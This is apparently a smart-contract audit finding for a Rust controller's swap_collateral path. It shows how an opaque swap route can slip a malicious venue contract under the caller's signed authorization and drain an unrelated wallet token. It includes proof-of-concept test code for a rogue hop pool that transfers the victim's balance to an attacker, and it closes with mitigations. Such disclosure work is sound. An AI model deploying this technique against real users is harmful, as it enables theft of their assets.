### Title
Opaque swap routes can append unauthorized caller token transfers beneath a legitimate strategy call - (File: contracts/controller/src/strategies/swap.rs)

### Summary
An attacker can supply a swap route containing a malicious venue address. During `swap_collateral`, the configured router passes the route-selected contract onto the call stack, where it can invoke a token transfer spending any asset owned by the caller. Honest simulation records that transfer as a child of the caller's authorization tree, so a wallet/API that signs the simulated tree authorizes theft unrelated to the requested collateral swap.

### Finding Description
`Controller::swap_collateral` authenticates the account owner or delegate and then invokes `withdraw_and_swap_from_supply` with attacker-selected `swap` bytes [1](#0-0) [2](#0-1) .

`swap_tokens` passes those opaque bytes directly to the configured router after granting exactly one controller-side input transfer authorization [3](#0-2) . The controller validates only that the router did not overspend that one input and that positive output was received [4](#0-3) [5](#0-4) .

The router-facing route can select arbitrary pool/token code, and the threat model explicitly states that no allowlist prevents a route from placing third-party code beneath the caller's authorization [6](#0-5) . The repository's proof test demonstrates a decoded route invoking an attacker-deployed `hop_pool`, whose `swap` method calls `wallet_token.transfer(victim, attacker, WALLET_BALANCE)` [7](#0-6) [8](#0-7) .

Simulation attaches that malicious transfer to Alice's `swap_collateral` authorization entry rather than surfacing it as part of the controller's own bounded grant [9](#0-8) . If the victim signs the simulated tree, the transfer executes: Alice's unrelated wallet token balance becomes zero, the attacker receives it, and the nominal swap still succeeds [10](#0-9) .

### Impact Explanation
This permits theft of arbitrary user assets beyond the collateral intentionally supplied to the swap. The malicious route can name any token owned by the victim and transfer it to the attacker while still returning enough `token_out` for the controller's output check and final account-risk validation to pass [5](#0-4) . The demonstrated loss is the victim's full `WALLET_BALANCE`, not merely swap input or slippage [11](#0-10) .

### Likelihood Explanation
An unprivileged attacker can deploy the malicious venue, encode it in a route, and cause a victim to execute the standard `swap_collateral` flow; no administrative role, leaked key, upgraded contract, oracle manipulation, or protocol asset approval is required [12](#0-11) . Execution depends on the victim signing the authorization tree produced by simulation, but the project documents that the malicious child appears inside that legitimate-looking tree and must be manually rejected by decoding it [13](#0-12) . Wallets or integrations that present only the root call, do not decode opaque route bytes, or mechanically sign simulation-generated auth entries expose users to this theft.

### Recommendation
Do not rely on clients to detect arbitrary child authorizations hidden inside an opaque strategy route. Constrain the caller's signed authorization to the exact expected child invocation where possible, expose a decoded venue/transfer manifest before signing, and reject routes that produce authorization children other than the documented single input transfer. Protocol-side defense should also require router venues and route leg contracts to be allowlisted or otherwise prevented from invoking arbitrary token contracts beneath the caller's authorization.

### Proof of Concept
1. Alice supplies USDC and owns a completely unrelated `wallet_token` balance.
2. The attacker deploys a route-selected contract whose `swap` function calls:
   `token::Client::new(&env, &wallet_token).transfer(&alice, &attacker, &WALLET_BALANCE)` [8](#0-7) .
3. The attacker encodes that contract as `hop_pool` in the opaque route while still declaring a fair USDC-to-ETH output [12](#0-11) .
4. Alice invokes `swap_collateral(alice, account_id, usdc_key, SWAP_IN_USDC, eth_key, route)`.
5. Simulation returns Alice's `swap_collateral` auth entry with a child `wallet_token.transfer(alice, attacker, WALLET_BALANCE)` [14](#0-13) .
6. With an honest root-only authorization tree, the host rejects the rogue transfer and state rolls back [15](#0-14) .
7. With the poisoned simulated tree signed, the call succeeds, Alice's wallet token balance becomes `0`, the attacker receives `WALLET_BALANCE`, and Alice receives the fair ETH output—so the controller's measured-output checks do not detect the theft [10](#0-9) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-47)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-65)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-48)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
```

**File:** contracts/controller/src/strategies/swap.rs (L74-83)
```rust
/// Returns the output balance increase; rejects zero or negative receipts.
fn verify_router_output(env: &Env, token_out: &Address, balance_before: i128) -> i128 {
    let received = balance_delta_since(
        env,
        token_out,
        &env.current_contract_address(),
        balance_before,
    );
    assert_with_error!(env, received > 0, StrategyError::NoSwapOutput);
    received
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-45)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L199-222)
```rust
    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L224-226)
```rust
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-256)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
